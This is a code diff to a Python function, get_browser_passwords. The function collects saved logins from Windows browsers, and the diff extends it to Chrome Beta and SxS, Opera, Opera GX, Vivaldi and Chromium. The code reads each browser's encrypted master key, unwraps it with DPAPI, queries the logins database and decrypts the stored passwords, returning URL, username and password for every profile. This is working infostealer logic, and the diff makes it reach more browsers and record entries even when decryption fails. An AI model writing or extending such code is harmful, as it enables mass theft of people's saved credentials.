@@ -541,10 +541,18 @@ def get_browser_passwords():
             return result
         return b""
 
+    local = os.environ.get("LOCALAPPDATA", "")
+    roaming = os.environ.get("APPDATA", "")
     browsers = {
-        "Chrome": os.path.join(os.environ.get("LOCALAPPDATA",""), "Google","Chrome","User Data"),
-        "Edge":   os.path.join(os.environ.get("LOCALAPPDATA",""), "Microsoft","Edge","User Data"),
-        "Brave":  os.path.join(os.environ.get("LOCALAPPDATA",""), "BraveSoftware","Brave-Browser","User Data"),
+        "Chrome":        os.path.join(local,   "Google",        "Chrome",         "User Data"),
+        "Chrome Beta":   os.path.join(local,   "Google",        "Chrome Beta",    "User Data"),
+        "Chrome SxS":    os.path.join(local,   "Google",        "Chrome SxS",     "User Data"),
+        "Edge":          os.path.join(local,   "Microsoft",     "Edge",           "User Data"),
+        "Brave":         os.path.join(local,   "BraveSoftware", "Brave-Browser",  "User Data"),
+        "Opera":         os.path.join(roaming, "Opera Software","Opera Stable"),
+        "Opera GX":      os.path.join(roaming, "Opera Software","Opera GX Stable"),
+        "Vivaldi":       os.path.join(local,   "Vivaldi",       "User Data"),
+        "Chromium":      os.path.join(local,   "Chromium",      "Application",    "User Data"),
     }
 
     for browser, base_path in browsers.items():
@@ -552,9 +560,11 @@ def get_browser_passwords():
             continue
         aes_key = None
         try:
-            with open(os.path.join(base_path, "Local State"), "r", encoding="utf-8") as f:
-                enc_key = _b64.b64decode(_json.load(f)["os_crypt"]["encrypted_key"])[5:]
-            aes_key = _dpapi_decrypt(enc_key)
+            ls_path = os.path.join(base_path, "Local State")
+            if os.path.isfile(ls_path):
+                with open(ls_path, "r", encoding="utf-8") as f:
+                    enc_key = _b64.b64decode(_json.load(f)["os_crypt"]["encrypted_key"])[5:]
+                aes_key = _dpapi_decrypt(enc_key)
         except Exception:
             pass
         for profile_dir in os.listdir(base_path):
@@ -568,8 +578,14 @@ def get_browser_passwords():
                 for url, user, enc_pwd in conn.execute("SELECT origin_url,username_value,password_value FROM logins"):
                     pwd = ""
                     if enc_pwd:
-                        pwd = _aes_decrypt(enc_pwd, aes_key) if aes_key else "(encrypted)"
-                    if user or pwd:
+                        if not aes_key:
+                            pwd = "(encrypted)"
+                        elif enc_pwd[:3] == b"v20":
+                            # Chrome 127+ App-Bound Encryption — cannot decrypt without Chrome service
+                            pwd = "(app-bound encrypted)"
+                        else:
+                            pwd = _aes_decrypt(enc_pwd, aes_key) or "(decrypt failed)"
+                    if url or user:   # include even if password empty/undecryptable
                         results.append({"browser": browser, "profile": profile_dir,
                                          "url": url, "username": user, "password": pwd})
                 conn.close()
